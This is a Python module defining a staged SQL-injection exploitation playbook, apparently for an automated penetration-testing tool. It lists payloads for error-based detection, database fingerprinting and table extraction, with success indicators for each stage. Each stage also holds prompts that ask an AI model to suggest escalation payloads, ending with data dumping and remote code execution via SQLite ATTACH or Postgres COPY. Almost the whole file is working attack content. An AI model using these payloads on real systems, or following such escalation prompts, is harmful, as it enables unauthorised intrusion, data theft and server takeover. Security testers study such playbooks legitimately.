from . import Playbook, ExploitStage, PayloadEntry

sqli_playbook = Playbook(
    vuln_type="sqli",
    description="Exploits SQL Injection vulnerabilities.",
    stages=[
        ExploitStage(
            name="error_based_detect",
            description="Test basic injection characters to induce SQL errors.",
            payloads=[
                PayloadEntry("'", "Single quote to break SQL string parsing."),
                PayloadEntry("\";--", "Double quote and comment to truncate queries."),
                PayloadEntry("' OR 1=1--", "Classic boolean bypass.")
            ],
            success_indicators=["SQL syntax", "sqlite3.OperationalError", "PostgreSQL", "mysql_fetch"],
            failure_indicators=["Invalid input"],
            next_stage_on_success="fingerprint_db",
            ai_escalation_prompt="We found SQL injection. Suggest payloads to fingerprint the exact database type using version queries or specific functions."
        ),
        ExploitStage(
            name="fingerprint_db",
            description="Identify the underlying database technology.",
            payloads=[
                PayloadEntry("' UNION SELECT sqlite_version()--", "SQLite fingerprinting."),
                PayloadEntry("' UNION SELECT version()--", "PostgreSQL/MySQL fingerprinting."),
                PayloadEntry("' UNION SELECT @@version--", "MSSQL fingerprinting.")
            ],
            success_indicators=["3.", "8.", "10.", "PostgreSQL", "Ubuntu"],
            failure_indicators=[],
            next_stage_on_success="extract_data",
            ai_escalation_prompt="Database fingerprinted. Suggest payloads to extract table names (e.g., from sqlite_master or information_schema)."
        ),
        ExploitStage(
            name="extract_data",
            description="Extract schema and data.",
            payloads=[
                PayloadEntry("' UNION SELECT tbl_name FROM sqlite_master WHERE type='table'--", "SQLite table names."),
                PayloadEntry("' UNION SELECT table_name FROM information_schema.tables--", "MySQL/PostgreSQL table names.")
            ],
            success_indicators=[],
            failure_indicators=[],
            next_stage_on_success=None,
            ai_escalation_prompt="Suggest further payloads to dump specific interesting tables or attempt RCE via SQLite attach / Postgres COPY."
        )
    ]
)
